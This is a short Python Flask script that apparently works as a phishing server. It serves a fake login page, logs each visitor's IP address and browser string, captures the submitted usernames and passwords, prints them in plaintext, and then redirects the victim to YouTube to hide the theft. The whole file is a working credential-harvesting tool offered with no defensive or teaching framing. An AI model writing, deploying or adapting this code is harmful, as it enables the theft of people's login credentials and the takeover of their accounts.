from flask import Flask, request, send_file, redirect

app = Flask(__name__)

@app.route('/')
def home():
    user_ip = request.remote_addr
    user_ag = request.headers.get('User-Agent')

    print(f"[visitor] IP: {user_ip}, Browser: {user_ag}")

    return send_file("logingnew.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    print(f"[LOGIN ATTEMPT] Username: {username}, password: {password}")

    return redirect("https://www.youtube.com")

if __name__ == '__main__':
   app.run(host="0.0.0.0",port=8000)
